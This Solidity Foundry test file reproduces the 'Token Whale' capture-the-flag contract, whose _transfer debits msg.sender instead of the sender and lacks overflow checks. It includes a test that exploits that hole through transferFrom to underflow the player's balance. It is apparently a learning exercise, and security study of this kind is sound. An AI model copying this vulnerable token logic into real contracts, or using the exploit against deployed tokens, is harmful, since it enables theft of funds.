// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";

contract ContractTest is Test {
        TokenWhaleChallenge TokenWhaleChallengeContract;
 

function testOverflow2() public {
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    TokenWhaleChallengeContract = new TokenWhaleChallenge();   
    TokenWhaleChallengeContract.TokenWhaleDeploy(address(this));
    console.log("Player balance:",TokenWhaleChallengeContract.balanceOf(address(this)));
    TokenWhaleChallengeContract.transfer(address(alice),800);
    // address(this) --> 200
    // alice --> 800
    vm.prank(alice);   
    TokenWhaleChallengeContract.approve(address(this),500);
    TokenWhaleChallengeContract.transferFrom(address(alice),address(bob),201); //exploit here
    emit log_named_uint("alice balance", TokenWhaleChallengeContract.balanceOf(alice));
    emit log_named_uint("bob balance", TokenWhaleChallengeContract.balanceOf(bob));

    console.log("Exploit completed, balance overflowed");
    console.log("Player balance:",TokenWhaleChallengeContract.balanceOf(address(this)));
    }
    receive() payable external{}
}
contract TokenWhaleChallenge {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function TokenWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function _transfer(address to, uint256 value) internal {
        /**
         * best practice
         * _balances[from] = fromBalance - amount;
         */
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;

        emit Transfer(msg.sender, to, value);
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _transfer(to, value);
    }
}